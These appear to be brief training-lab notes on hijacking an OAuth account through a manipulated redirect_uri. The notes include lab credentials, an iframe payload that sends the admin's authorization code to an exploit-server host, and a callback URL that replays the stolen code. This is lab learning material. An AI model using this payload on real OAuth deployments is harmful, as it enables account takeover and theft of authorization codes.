Lab #4 – OAuth account hijacking via redirect_uri

Vulnerable functionality - OAuth implementation.

Goal - Exploit the implementation flaw to steal the authorization code of the admin user.

Creds - wiener:peter

Analysis:


<iframe src="https://oauth-0aac00c303b04ae381c64bbe028f00b3.oauth-server.net/auth?client_id=szp5oknc38eyjict6qzos&redirect_uri=https://exploit-0a6500fc03dd4a9381204c98012300ef.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>




https://0aca004003684a4181ac4d240032004f.web-security-academy.net/oauth-callback?code=BgH9jofP6vbEM9psYiHpqIxyahEAEm23MPFhXh6UE0z